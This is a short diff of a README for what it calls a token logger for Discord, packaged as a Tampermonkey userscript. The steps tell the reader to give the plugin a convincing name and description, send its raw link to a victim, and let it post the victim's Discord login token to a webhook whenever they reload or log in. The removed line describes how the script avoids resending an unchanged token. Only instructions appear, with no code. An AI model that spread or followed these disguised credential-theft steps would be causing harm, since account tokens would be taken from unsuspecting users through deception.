@@ -7,4 +7,3 @@ a really lame token logger for discord lol
 3. **make the plugin name and description convincing!**
 4. copy the raw file link, and send it to someone with tampermonkey lol
 5. now when reload discord or login to an account it'll send the token via a webhook!
-   - if their token doesn't change, it will not resend the token (this is to prevent them from spamming the webhook by constantly reloading the page or constantly opening discord)
